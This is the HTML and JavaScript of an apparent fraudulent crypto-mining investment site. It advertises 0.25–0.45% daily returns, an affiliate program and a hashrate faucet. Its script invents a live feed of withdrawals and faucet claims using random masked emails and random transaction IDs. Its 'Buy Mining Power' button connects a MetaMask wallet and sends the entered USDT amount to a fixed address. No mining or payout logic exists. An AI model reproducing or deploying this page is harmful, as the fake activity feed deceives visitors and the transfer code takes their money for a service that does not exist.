<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Crypto Mining</title>
<link rel="icon" href="https://cryptologos.cc/logos/bitcoin-btc-logo.png" type="image/png">
<style>
body { font-family: Arial, sans-serif; margin:0; padding:0; background:#f4f4f4; }
header { background:#222; color:#fff; padding:10px 20px; display:flex; justify-content:space-between; align-items:center; }
header h1 { margin:0; font-size:1.5em; }
nav a { color:#fff; margin-left:15px; text-decoration:none; }
#loginModal, #dashboard { display:none; }
.modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); display:flex; justify-content:center; align-items:center; }
.modal-content { background:#fff; padding:20px; border-radius:8px; width:300px; text-align:center; }
input[type=email], button { width:100%; padding:10px; margin:5px 0; border-radius:5px; border:1px solid #ccc; }
button { cursor:pointer; background:#28a745; color:#fff; border:none; }
table { width:100%; border-collapse:collapse; margin-top:10px; background:#fff; }
th, td { padding:8px; text-align:center; border:1px solid #ddd; }
th { background:#222; color:#fff; }
.balance-row { display:flex; justify-content:space-between; margin:5px 0; padding:5px 10px; background:#fff; border-radius:5px; }
.section { padding:20px; background:#fff; margin:10px 20px; border-radius:8px; }
.coin-list { margin:10px 0; }
</style>
</head>
<body>

<header>
  <h1>Crypto Mining</h1>
  <nav>
    <a href="#" id="loginBtn">Login</a>
    <a href="#" id="logoutBtn" style="display:none;">Logout</a>
  </nav>
</header>

<!-- Login Modal -->
<div class="modal" id="loginModal">
  <div class="modal-content">
    <h2>Login</h2>
    <input type="email" id="emailInput" placeholder="Enter email">
    <button id="modalLogin">Login</button>
  </div>
</div>

<!-- Main Dashboard -->
<div id="dashboard">
  <div class="section">
    <h2>Crypto Mining Logo</h2>
    <p id="userEmailDisplay"></p>
    <button id="connectWallet">Connect MetaMask</button>
    <p id="walletAddress"></p>
    <button id="logoutBtn2">Logout</button>
  </div>

  <div class="section coin-list">
    <h3>Available Coins to Mine</h3>
    <p>Bitcoin | Ethereum | Litecoin | Solana | Dogecoin | BNB | TRON | TON</p>
  </div>

  <div class="section">
    <h3>Crypto Mining Overview</h3>
    <p>Crypto Mining operates Aleo mining operations to provide consistent returns of 0.25–0.45% daily. We accept deposits in multiple cryptocurrencies.</p>
    <p>Daily Returns: 0.25–0.45%</p>
    <p>Supported Coins: 15+</p>
    <p>Reviews: Trustpilot ↗</p>
  </div>

  <div class="section">
    <h3>Latest Transactions</h3>
    <table>
      <thead>
        <tr><th>User</th><th>Type</th><th>Amount</th><th>TX ID</th><th>Time</th></tr>
      </thead>
      <tbody id="txBody"></tbody>
    </table>
  </div>

  <div class="section">
    <h3>Free Faucet</h3>
    <table>
      <thead>
        <tr><th>User</th><th>Reward</th><th>Time</th></tr>
      </thead>
      <tbody id="faucetBody"></tbody>
    </table>
    <button id="claimBtn">Claim 1 H/s</button>
  </div>

  <div class="section">
    <button id="buyUSDTBtn">Buy Mining Power (USDT)</button>
  </div>

  <div class="section">
    <p>Affiliate Program: Earn 2% from friends' deposits and 2 H/s each new friend.</p>
    <p>Crypto Mining © 2025. Hashrate Faucet Platform. Telegram Channel</p>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
<script>
// User Login
let currentUser = null;
const loginBtn = document.getElementById('loginBtn');
const logoutBtn = document.getElementById('logoutBtn');
const logoutBtn2 = document.getElementById('logoutBtn2');
const loginModal = document.getElementById('loginModal');
const emailInput = document.getElementById('emailInput');
const modalLogin = document.getElementById('modalLogin');
const dashboard = document.getElementById('dashboard');
const userEmailDisplay = document.getElementById('userEmailDisplay');

loginBtn.addEventListener('click', ()=> loginModal.style.display='flex');
logoutBtn.addEventListener('click', logoutUser);
logoutBtn2.addEventListener('click', logoutUser);

function logoutUser(){
  currentUser=null;
  dashboard.style.display='none';
  loginBtn.style.display='inline';
  logoutBtn.style.display='none';
}

modalLogin.addEventListener('click', ()=>{
  const email = emailInput.value.trim();
  if(!email){ alert('Enter email'); return; }
  currentUser = { email };
  loginModal.style.display='none';
  dashboard.style.display='block';
  loginBtn.style.display='none';
  logoutBtn.style.display='inline';
  userEmailDisplay.textContent = email.replace(/(.{3}).+(@.+)/,"$1***$2");
  startSimulation();
});

// Transaction / Faucet Simulation
const txBody = document.getElementById('txBody');
const faucetBody = document.getElementById('faucetBody');
const claimBtn = document.getElementById('claimBtn');
const names = ["ytpa","jose","cohe","meoi","shoa","resh","7sun","spam","azri","sath","vuac","herb","osve","kito","mo24","wil","kbhn"];
const coins = ["BTC","ETH","LTC","SOL","DOGE","BNB","TRX","TON","BCH","XMR","POL","USDT","USDC","DAI","SHIB","NOT"];
function pick(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
function rand(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
function timeLabel(){ return new Date().toLocaleTimeString(); }
function genTxId(len){ const chars='0123456789abcdef'; let s=''; for(let i=0;i<len;i++) s+=chars[Math.floor(Math.random()*chars.length)]; return s; }
function formatAmount(){ return (Math.random()*10).toFixed(6); }

function pushTx(){
  const row={user:pick(names)+"***@gmail.com",type:'WITHDRAW',amount:formatAmount()+" "+pick(coins),tx:genTxId(8)+'...'+genTxId(4),time:'Just now'};
  const tr=document.createElement('tr');
  tr.innerHTML=`<td>${row.user}</td><td>${row.type}</td><td>${row.amount}</td><td>${row.tx}</td><td>${row.time}</td>`;
  txBody.insertBefore(tr,txBody.firstChild);
  while(txBody.children.length>50) txBody.removeChild(txBody.lastChild);
}

function pushFaucet(){
  const row={user:pick(names)+"***@gmail.com",reward:rand(1,5)+".0 H/s",time:"Just now"};
  const tr=document.createElement('tr');
  tr.innerHTML=`<td>${row.user}</td><td>${row.reward}</td><td>${row.time}</td>`;
  faucetBody.insertBefore(tr,faucetBody.firstChild);
  while(faucetBody.children.length>50) faucetBody.removeChild(faucetBody.lastChild);
}

function startSimulation(){
  for(let i=0;i<6;i++){ pushTx(); pushFaucet(); }
  setInterval(pushTx,3000);
  setInterval(pushFaucet,5000);
}

claimBtn.addEventListener('click', ()=>{
  if(!currentUser){ alert('Login first'); return; }
  pushFaucet();
  claimBtn.textContent='Claimed ✓';
  setTimeout(()=>claimBtn.textContent='Claim 1 H/s',1200);
});

// MetaMask + USDT Purchase
const connectWalletBtn = document.getElementById('connectWallet');
const walletAddressP = document.getElementById('walletAddress');
let web3, userAccount;

async function connectWallet(){
  if(window.ethereum){
    web3 = new Web3(window.ethereum);
    try{
      const accounts = await ethereum.request({ method:'eth_requestAccounts' });
      userAccount = accounts[0];
      walletAddressP.textContent = 'Wallet: '+userAccount;
    }catch(err){ alert('User rejected'); }
  } else alert('MetaMask not found');
}

connectWalletBtn.addEventListener('click',connectWallet);

document.getElementById('buyUSDTBtn').addEventListener('click', async ()=>{
  if(!userAccount){ alert('Connect MetaMask first'); return; }
  const amount = prompt('Enter USDT amount:');
  if(!amount || isNaN(amount)) return;
  const usdtAddress="0xdAC17F958D2ee523a2206206994597C13D831ec7";
  const toAddress="0xeC50a1f60571B10AD6840e0841d439a4F5cDD80c";
  const contract = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}], usdtAddress);
  try{
    const tx = await contract.methods.transfer(toAddress,web3.utils.toWei(amount,'mwei')).send({from:userAccount});
    alert('Transaction sent: '+tx.transactionHash);
  }catch(e){ alert('Transaction failed'); }
});
</script>

</body>
</html>
